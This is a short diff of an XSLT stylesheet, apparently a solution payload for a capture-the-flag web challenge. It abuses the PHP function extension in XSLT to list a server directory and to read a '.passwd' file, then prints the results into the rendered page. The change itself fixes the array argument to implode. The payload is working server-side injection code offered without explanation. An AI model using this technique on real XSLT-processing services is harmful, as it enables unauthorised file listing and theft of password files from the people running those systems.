@@ -4,7 +4,7 @@ xmlns:php="http://php.net/xsl"
 >	
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" />
-<xsl:param  name="strscand"   select="php:function('implode',array($shandle),'')" /> 
+<xsl:param  name="strscand"   select="php:function('implode',php:array($shandle),'')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/file .passwd')"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
